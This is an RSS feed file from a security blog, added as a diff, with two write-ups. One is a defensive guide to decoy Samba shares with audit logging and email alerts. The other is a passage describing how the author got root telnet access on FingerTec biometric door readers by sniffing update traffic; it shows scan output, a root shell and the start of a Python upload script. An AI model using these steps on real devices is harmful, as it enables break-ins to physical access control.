@@ -1,0 +1,1009 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+	<channel>
+		<title>Digital Panther Security</title>
+		<description>Various writeups</description>
+		<link>https://digital-panther.com</link>
+		<atom:link href="https://digital-panther.com/feed.xml" rel="self" type="application/rss+xml" />
+		
+			<item>
+				<title>Booby Trapping Samba Shares</title>
+				<description>&lt;h1 id=&quot;booby-trapping-samba-shares&quot;&gt;Booby Trapping Samba Shares&lt;/h1&gt;
+
+&lt;p&gt;This is a simple guide to setting up fake Samba shares that’ll send you an email when accessed.  The idea is that an attacker, after getting into your network, is going to search around for the good stuff.  If you mix in low hanging fruit, it can give you an early indicator if someone is in your network.&lt;/p&gt;
+
+&lt;p&gt;This guide is assuming you already have a configured Samba server, up and operational.&lt;/p&gt;
+
+&lt;h2 id=&quot;samba-config&quot;&gt;Samba Config&lt;/h2&gt;
+
+&lt;p&gt;Unfortunately, I couldn’t find any way to separate out log files based on share.  What we’ll need to do is make sure auditing is configured, and look through syslogs for anything suspicious.&lt;/p&gt;
+
+&lt;h3 id=&quot;a-note-about-auditing&quot;&gt;A note about auditing&lt;/h3&gt;
+
+&lt;p&gt;Fair warning, depending on your normal usage, this will create a lot of log entries.  The settings below will log pretty much everything your users do on the server.  As someone who has dealt with “Well, I don’t know what happened, my work just disappeared” a few too many times, I think it is a very fair price to pay.&lt;/p&gt;
+
+&lt;h3 id=&quot;extra-settings-for-global&quot;&gt;Extra settings for [global]&lt;/h3&gt;
+
+&lt;p&gt;The following extra settings need to be enabled in the [global] section of your smb.conf:&lt;/p&gt;
+
+&lt;p&gt;full_audit:prefix = %u|%I|%S&lt;br /&gt;
+   full_audit:failure = connect&lt;br /&gt;
+   full_audit:success = connect disconnect mkdir rmdir open close read pread write pwrite sendfile rename unlink chmod fchmod chown fchown chdir ftruncate lock symlink readlink link mknod realpath&lt;br /&gt;
+   full_audit:facility = local5&lt;br /&gt;
+   full_audit:priority = notice&lt;br /&gt;
+   vfs object = full_audit&lt;/p&gt;
+
+&lt;p&gt;This enables full auditing, and has it log to syslog.  If necessary, you can always scale it back by changing what gets actually logged.  The one we definitely use is chdir for the rule below.&lt;/p&gt;
+
+&lt;h3 id=&quot;new-share&quot;&gt;New Share&lt;/h3&gt;
+
+&lt;p&gt;Next, create the share (or shares) that you want to be traps.  A simple example is below:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[passwords]
+	comment = Centralized Password Storage
+	path = /srv/samba/passwords
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Create the folder and give it read permissions.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@server:~/$ sudo mkdir -p /srv/samba/passwords
+user@server:~/$ sudo chmod a+rX /srv/samba/passwords
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Restart samba, and all the audit data should be going to syslog.&lt;/p&gt;
+
+&lt;h2 id=&quot;swatch-config&quot;&gt;Swatch Config&lt;/h2&gt;
+
+&lt;p&gt;Swatch is used for actually monitoring the log file, to look for a specific pattern, and take action when it finds a result.  First things first, we’ll install swatch.  It is a pretty standard application, and should be available in the package manager of your choice.  For example, also in Ubuntu:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@server:~/$ sudo apt-get install swatch
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Next, create a config file.  Here is a very simple one:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;user@server:~$ cat /etc/swatch.conf 
+watchfor	/passwords\|chdir\|ok\|chdir/
+	echo
+	mail = youremail@domain.com
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Change out ‘passwords’ with whatever you have named your share.  The text inside the /data/ is what will be matched by swatch.  You can add other strings to catch on here if you want, but this will notify you the first time a user accesses a share.&lt;/p&gt;
+
+&lt;p&gt;NOTE: FOR THE LOVE OF GOD, MAKE SURE YOU PUT THAT BACKSLASH IN FRONT OF THAT PIPE.  Pipe by itself means OR, which means you’ll match a lot of things.  Your coworkers will not be happy with 1000s of alerts within a few minutes.&lt;/p&gt;
+
+&lt;p&gt;Next, you’ll need to set up the init.d/systemd startup script.  Below is a sample of each:&lt;/p&gt;
+
+&lt;h3 id=&quot;systemv&quot;&gt;SystemV&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;/etc/init.d/swatch
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/sh&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Simple Log Watcher Program&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;$1&amp;quot;&lt;/span&gt; in
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;start&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+		/usr/bin/swatch --daemon --config-file&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc/swatch.conf --tail-file&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/var/log/syslog --pid-file&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/var/run/swatch.pid
+		&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;stop&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+		&lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;cat /var/run/swatch.pid&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
+		&lt;span class=&quot;nb&quot;&gt;kill&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PID&lt;/span&gt;
+		&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
+*&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+		&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Usage: $0 { start | stop }&amp;quot;&lt;/span&gt;
+		&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;esac&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;pre&gt;&lt;code&gt;user@server:~/$ sudo chmod +x /etc/init.d/swatch
+user@server:~/$ sudo update-rc.d swatch defaults
+user@server:~/$ sudo service swatch start
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;systemd&quot;&gt;Systemd&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;/usr/lib/systemd/system/swatch.service
+
+[Unit]
+Description=Swatch Log Monitoring Daemon
+After=syslog.target
+
+[Service]
+ExecStart=/usr/bin/swatch --config-file=/etc/swatch.conf --tail-file=/var/log/syslog --pid-file=/var/run/swatch.pid --daemon
+ExecStop=kill -s KILL $(cat /var/run/swatch.pid)
+Type=forking
+PIDFile=/var/run/swatch/pid
+
+[Install]
+WantedBy=multi-user.target
+
+
+user@server:~/$ sudo systemctl enable swatch.service
+user@server:~/$ sudo systemctl start swatch.service
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;further-use&quot;&gt;Further Use&lt;/h2&gt;
+
+&lt;p&gt;Now that you have your nice booby-trapped Samba share, you can always take it a step further and put some fun items in.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://sourceforge.net/p/adhd/wiki/Web%20Bug%20Server/&quot;&gt;http://sourceforge.net/p/adhd/wiki/Web%20Bug%20Server/&lt;/a&gt;&lt;/p&gt;
+</description>
+				<pubDate>Tue, 12 Jan 2016 00:00:00 -0500</pubDate>
+				<link>https://digital-panther.com/2016/01/booby-trapped-samba-shares</link>
+				<guid isPermaLink="true">https://digital-panther.com/2016/01/booby-trapped-samba-shares</guid>
+			</item>
+		
+			<item>
+				<title>FingerTec Biometric Access Control Devices - Remote Code Exec and Remote Enrollment</title>
+				<description>&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
+
+&lt;p&gt;In a company I worked for years ago, we moved from card swipe to biometric readers for access control.  It was more convenient for the office staff, and people didn’t lose their fingers nearly as often as cards.  The first ones we got were BioScrypt V-Flex readers, by KanTech.  They were expensive, wired into this serial port muxing mess, and shorted out if you had any static on you.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Bioscrypt_V-flex.jpg&quot; alt=&quot;BioScrypt Readers&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A few years ago we found FingerTec devices.  They had much better fingerprint detection, were static proof, and most importantly, used TCP/IP.  This meant that we could easily manage dozens of devices over several offices geographically.  They also accept RFID and/or pin codes, and any combination thereof.  We started off with the AC900s and moved up to the R2s.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/fingertec.jpg&quot; alt=&quot;FingerTec R2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I’ve been wanting to play with these in a bit more detail, and a couple of months ago I got some free time to work on it.&lt;/p&gt;
+
+&lt;h2 id=&quot;initial-analysis&quot;&gt;Initial analysis&lt;/h2&gt;
+
+&lt;p&gt;First thing I did was run a port scan on the device.  I’m doing this on a spare AC900 that we have.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ nmap 10.117.43.12 -A -p0-65535
+
+Starting Nmap 7.00 ( https://nmap.org ) at 2015-12-16 15:54 EST
+Nmap scan report for 10.117.43.12
+Host is up (0.057s latency).
+Not shown: 65533 closed ports
+PORT     STATE    SERVICE VERSION
+0/tcp    filtered unknown
+23/tcp   open     telnet  ZKSoftware ZEM500 fingerprint reader telnetd (Linux 2.4.20; MIPS)
+4368/tcp open     unknown
+Service Info: OS: Linux; Device: security-misc; CPE: cpe:/o:linux:linux_kernel:2.4.20
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 163.61 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ok, so it is running telnet.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ telnet 10.117.43.12
+Trying 10.117.43.12...
+Connected to 10.117.43.12.
+Escape character is &#39;^]&#39;.
+
+Welcome to Linux (ZEM500) for MIPS
+Kernel 2.4.20 Treckle on an MIPS
+ZEM500 login: 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;attack&quot;&gt;Attack&lt;/h2&gt;
+
+&lt;p&gt;A quick google search turns up some interesting information from other people:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://kishfellow.blogspot.com/2013/11/website-www.html&quot;&gt;kishfellow.blogspot.com&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;and&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://blog.infobytesec.com/2014/07/perverting-embedded-devices-zksoftware_2920.html&quot;&gt;blog.infobytesec.com&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;It seems the base device is made by ZKSoftware, and FingerTec resells/customizes it.  There is no web server running, so I can’t try out any of those vulnerabilities.  All I have is telnet, and the software’s own protocol.&lt;/p&gt;
+
+&lt;p&gt;My goal: Get the root password.  I’d be willing to bet money at this point it is a hard coded password.&lt;/p&gt;
+
+&lt;p&gt;I also happen to have a firmware update.  Maybe I’d get lucky and the firmware is just an ext3 image.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ unzip ~/Downloads/AC900_565.zip 
+Archive:  /home/danny/Downloads/AC900_565.zip
+  inflating: FTUpdate.exe            
+  inflating: main.tgz                
+  inflating: Readme.txt  
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ok, so it uses a windows application to do the updating.  Contents of Readme.txt:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Please follow below steps to update:
+
+1. Enter your reader IP and connect
+2. Check the manu date (manufacturer date) display in the list after connect
+3. If you reader manu date if before July 2008, please select &quot;Customize Options&quot;, else just select &quot;Default Options&quot;
+4. Click Udpdate and wait until 5 steps completed. 
+5. Reader will restart after successful.
+
+
+
+ps: 
+1. If you selected &quot;Default Options&quot; and the update program stuck after &quot;Connected&quot;, please select &quot;Customize Options&quot; and reupdate. 
+
+2. If it&#39;s still stuck, please go to reader MENU -&amp;gt; Options -&amp;gt; Comm Opt -&amp;gt; COMM Key, change to &quot;1&quot;, restart reader and change it back to &quot;0&quot; and restart it again. After restart please select &quot;Customize Options&quot; and update again.
+
+3. If you selected &quot;Customize Options&quot; and the update program stuck after &quot;Connected&quot;, please select &quot;Default Options&quot; and reupdate.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Well, seems simple enough.  Time to extract main.tgz, which probably contains a disk image.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ tar zxfv main.tgz
+auto.sh
+LANGUAGE.E
+libdlcl.so
+main
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Wait.. what the..&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ file main
+main: ELF 32-bit LSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked, interpreter /lib/ld.so.1, for GNU/Linux 2.6.0, stripped
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ok, this appears to be just files, that are updated.  This obviously seems ripe for embedding malware and just uploading that as a firmware update can probably get me in.  How about that auto.sh&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#!/bin/sh
+SRC=$USERDATAPATH
+DEST=/mnt/mtdblock
+DEST2=/mnt/mtdblock/drivers
+DEST3=/mnt/mtdblock/data
+
+ifconfig eth0 192.168.1.201 up
+
+ALGOLIB=/mnt/mtdblock/lib/libzkfp.so.3.5.1
+ALGOLIB=/mnt/mtdblock/lib/libzkfp.so.3.5.1
+export FPSENSORLIB_PATH=/mnt/mtdblock/lib/fpsensor_lib
+if [ -f  /mnt/mtdblock/lib/libfpsensor.so ]; then
+ln -s /mnt/mtdblock/lib/libfpsensor.so /lib/libfpsensor.so -f
+fi
+
+ln -s $DEST/lib/libzkfp.so.3.5.1 /lib/libzkfp.so.3 -f
+ln -s $DEST/lib/libzkfp.so.3.5.1 /lib/libzkfp.so -f
+ln -s $DEST/lib/libzkfp.so.4.0.0 /lib/libzkfp.so.10 -f
+ln -s $DEST/lib/libpthread.so /lib/libpthread.so.0 -f
+ln -s $DEST/lib/libfpsensor.so /lib/libfpsensor.so -f
+ln -s $DEST/lib/libdlcl.so.1 /lib/libdlcl.so -f
+ln -s $DEST/lib/libstdc++.so.6.0.8 /lib/libstdc++.so.6 -f
+ln -s $DEST/lib/libgcc_s.so.1 /lib/libgcc_s.so.1 -f
+ln -s $DEST/lib/libttf.so /lib/libttf.so -f
+ln -s $DEST/lib/libhttppush.so /lib/libhttppush.so -f
+ln -s /mnt/mtdblock/libdlcl.so /lib/libdlcl.so -f
+
+mknod /dev/video0 c 81 0
+mknod /dev/uba  b 180 0 
+mknod /dev/uba1 b 180 1
+mknod /dev/uba2 b 180 2
+mknod /dev/ubb  b 180 8
+mknod /dev/ubb1 b 180 9
+mknod /dev/ubb2 b 180 10
+mknod /dev/ubc  b 180 16
+mknod /dev/ubc1 b 180 17
+mknod /dev/ubc2 b 180 18
+mknod /dev/ubd  b 180 24
+mknod /dev/ubd1 b 180 25
+mknod /dev/ubd2 b 180 26
+mknod /dev/ube  b 180 32
+mknod /dev/ube1 b 180 33
+mknod /dev/ube2 b 180 34
+mknod /dev/ubf  b 180 40
+mknod /dev/ubf1 b 180 41
+mknod /dev/ubf2 b 180 42
+mknod /dev/ubg  b 180 48
+mknod /dev/ubg1 b 180 49
+mknod /dev/ubg2 b 180 50
+mount  -t usbfs none /proc/bus/usb
+
+if [ -f  /mnt/mtdblock/drivers/gspca.ko ]; then
+        insmod /mnt/mtdblock/drivers/gspca.ko
+fi
+if [ -f  /mnt/mtdblock/lib/libfpsensor.so ]; then
+ln -s /mnt/mtdblock/lib/libfpsensor.so /lib/libfpsensor.so -f
+fi
+if [ -f  /mnt/mtdblock/lib/libjpeg.so ]; then
+ln -s /mnt/mtdblock/lib/libjpeg.so /lib/libjpeg.so.62 -f
+fi
+if [ -f $DEST/lib/libzkfp.so.4.0.0 ]; then
+    cd $DEST/lib &amp;amp;&amp;amp; gunzip libzkfp.so.4.0.0 -f  &amp;amp;&amp;amp; sync
+fi
+
+if [ -f $DEST/libwebserver.tgz ]; then
+  cd /lib &amp;amp;&amp;amp; tar -zxvf $DEST/libwebserver.tgz
+fi
+
+if [ -f /mnt/mtdblock/libwebserver_a.so ]; then
+        ln -s /mnt/mtdblock/libwebserver_a.so /lib/libweb.so -f
+fi
+
+if [ -d $DEST/data/ ]; then
+    if [ -f $DEST3/extlog.dat ]; then
+        echo &quot;extlog in /mnt/mtdblock/data&quot;
+    else
+        if [ -f $DEST/extlog.dat ]; then
+            mv $DEST/extlog.dat $DEST/data/ &amp;amp;&amp;amp; cd $DEST &amp;amp;&amp;amp; rm $DEST/extlog.dat &amp;amp;&amp;amp; sync
+        fi
+    fi
+fi
+
+if [ -d $DEST/data/ ]; then
+    if [ -f $DEST3/transaction.dat ]; then
+        echo &quot;transaction in /mnt/mtdblock/data&quot;
+    else
+        if [ -f $DEST/transaction.dat ]; then
+            mv $DEST/transaction.dat $DEST/data/ &amp;amp;&amp;amp; cd $DEST &amp;amp;&amp;amp; rm $DEST/transaction.dat &amp;amp;&amp;amp; sync
+        fi
+    fi
+fi
+                                                
+if [ -f $DEST/mainwav ]; then
+        cd $DEST &amp;amp;&amp;amp; chmod u+x $DEST/mainwav &amp;amp;&amp;amp; $DEST/mainwav
+fi
+
+if [ -f $DEST/playwav ]; then
+     cd $DEST &amp;amp;&amp;amp; chmod u+x $DEST/playwav &amp;amp;&amp;amp; $DEST/playwav E_0.wav;
+fi
+
+if [ -f $DEST/drivers/hv7131.ko ]; then
+     insmod $DEST/drivers/hv7131.ko
+fi
+
+if [ -f $DEST2/cim.ko ]; then
+        insmod $DEST2/cim.ko 
+fi
+
+if [ -f $DEST2/dummy.ko ]; then
+        insmod $DEST2/dummy.ko 
+fi
+
+if [ ! -c /dev/ttygs ]; then
+  mknod /dev/ttygs c 127 0
+fi
+
+if [ -f $DEST2/nand_drv.ko ]; then
+        insmod $DEST2/nand_drv.ko 
+fi
+
+if [ -f $DEST2/jz4730_udc.ko ]; then
+        insmod $DEST2/jz4730_udc.ko
+fi
+
+if [ -f $DEST2/g_serial.ko ]; then
+        insmod $DEST2/g_serial.ko use_acm=1
+fi
+
+if [ -f /mnt/mtdblock/rt73.ko ]; then
+        cd /mnt/mtdblock/drivers &amp;amp;&amp;amp; rm jz4730_udc.ko g_serial.ko -f &amp;amp;&amp;amp; sync
+fi
+
+if [ -f /mnt/mtdblock/rt73.ko ]; then
+        insmod /mnt/mtdblock/rt73.ko
+fi
+
+rm -rf /etc/rt73sta.dat
+
+if [ -f $DEST/usbpower.zem500 ]; then
+  chmod u+x $DEST/usbpower.zem500 &amp;amp;&amp;amp; $DEST/usbpower.zem500
+fi
+
+if [ -f $DEST/main.gz ]; then
+  cd $DEST &amp;amp;&amp;amp; rm main -f &amp;amp;&amp;amp; gunzip main.gz &amp;amp;&amp;amp; sync
+fi
+
+if [ -f $DEST/main ]; then
+   chmod u+x $DEST/main &amp;amp;&amp;amp; cd $DEST &amp;amp;&amp;amp; $DEST/main&amp;amp;
+fi
+
+if [ -f $DEST/inbiocomm ];then
+  chmod u+x $DEST/inbiocomm &amp;amp;&amp;amp; cd $DEST &amp;amp;&amp;amp; $DEST/inbiocomm&amp;amp;
+fi
+  
+if [ -f $DEST/data/wdt_new ]; then
+  cd $DEST/data &amp;amp;&amp;amp; chmod u+x $DEST/data/wdt_new &amp;amp;&amp;amp; $DEST/data/wdt_new -p 5 -t 3600 -m &quot;$DEST/main&quot; -n &quot;$DEST/inbiocomm&quot;
+fi
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Well, that looks like a startup script if I’ve ever seen one.  Now I’m going to try and run the firmware update cleanly, and just capture what happens.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/fingertec_update.png&quot; alt=&quot;FingerTec Update success&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Well, it looks like the update went through fine.  Next I scrolled through the packet capture.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/fingertec_packet1.png&quot; alt=&quot;FingerTec Packet Capture 1&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It looks like it tries to connect via TCP a couple of times, fails, and then connects via UDP.  This is what gives the initial version and device info before you hit ‘update’.  Scrolling it bit farther down you find…&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/fingertec_packet2.png&quot; alt=&quot;FingerTec Packet Capture 2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;TELNET!?!?!&lt;/em&gt;   Why would the update process be communicating over telnet?&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/fingertec_packet3.png&quot; alt=&quot;FingerTec Packet Capture 3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Well, as we can see here, the update software starts a tftp server, telnets in as root, and tells the device to tftp the update from the fingerprint reader.  Then it extracts it over the flash storage.  It actually failed to get the file since the TFTP server doesn’t seem to know anything about disabling firewalls.&lt;/p&gt;
+
+&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;
+
+&lt;p&gt;Now that we have the root password, let’s see what we can do on this device&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Welcome to Linux (ZEM500) for MIPS
+Kernel 2.4.20 Treckle on an MIPS
+ZEM500 login: root
+Password: 
+
+
+BusyBox v1.1.3 (2007.10.09-20:41+0000) Built-in shell (ash)
+Enter &#39;help&#39; for a list of built-in commands.
+
+# busybox
+BusyBox v1.1.3 (2007.10.09-20:41+0000) multi-call binary
+
+Usage: busybox [function] [arguments]...
+   or: [function] [arguments]...
+
+        BusyBox is a multi-call binary that combines many common Unix
+        utilities into a single executable.  Most people will create a
+        link to busybox for each function they wish to use and BusyBox
+        will act like whatever it was invoked as!
+
+Currently defined functions:
+        [, [[, ash, bunzip2, busybox, bzcat, cat, chmod, cp, date, df,
+        dmesg, du, echo, env, free, ftpget, ftpput, getty, gunzip, gzip,
+        halt, hostname, ifconfig, inetd, init, insmod, kill, killall,
+        ln, login, ls, lsmod, mkdir, mknod, mount, mv, passwd, ping, poweroff,
+        ps, pwd, rdate, reboot, rm, rmdir, rmmod, route, sh, sync, tar,
+        telnetd, test, tftp, traceroute, tty, umount, uptime, vi, wget,
+        zcat
+
+# 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It seems we have a pretty limited busybox shell.  We do have ftpput and ftpget though, and we can use those to transfer files.  I didn’t really feel like getting an FTP server set up for this though, so instead wrote a script to use echo to upload a more recent version of busybox.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env python&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;telnetlib&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pdb&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;RemoteServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;root&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+            &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;
+
